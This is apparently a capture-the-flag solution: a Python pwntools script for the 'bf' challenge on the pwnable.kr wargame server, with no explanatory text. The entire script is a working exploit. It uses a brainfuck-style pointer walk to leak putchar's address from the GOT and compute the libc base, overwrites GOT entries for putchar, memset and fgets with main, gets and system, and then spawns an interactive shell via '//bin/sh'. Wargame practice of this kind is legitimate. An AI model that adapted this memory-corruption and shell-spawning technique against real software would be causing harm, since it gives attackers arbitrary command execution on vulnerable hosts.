'''
Soon...
'''
from pwn import *


def exploit():
    con = remote('pwnable.kr', 9001)
    libc = ELF('bf_libc.so')
    p_addr = 0x804a0a0
    fgets_got_addr = 0x804a010
    memset_got_addr = 0x804a02c
    putchar_got_addr = 0x804a030
    main_addr = 0x8048671
    # putchar leak
    payload = back(p_addr - putchar_got_addr) + '.' + read(4)
    # overwrite putchar to main
    payload += back(4) + write(4)
    # overwrite memset to gets
    payload += back(putchar_got_addr - memset_got_addr + 4) + write(4)
    # overwrite fgets to system
    payload += back(memset_got_addr - fgets_got_addr + 4) + write(4)
    # jmp to main
    payload += '.'
    con.recvuntil('[ ]\n')
    con.sendline(payload)
    con.recv()
    # get funcs addresses
    putchar_libc_addr = libc.symbols['putchar']
    gets_libc_addr = libc.symbols['gets']
    system_libc_addr = libc.symbols['system']
    putchar_addr = u32(con.recv(4))
    print(putchar_addr)
    got_libc_offset = putchar_addr - putchar_libc_addr
    gets = gets_libc_addr + got_libc_offset
    system = system_libc_addr + got_libc_offset
    con.send(p32(main_addr))
    con.send(p32(gets))
    con.send(p32(system))
    con.sendline('//bin/sh\0')
    con.interactive()


def back(n):
    return '<' * n


def read(n):
    return '.>' * n


def write(n):
    return ',>' * n


if __name__=='__main__':
    exploit()
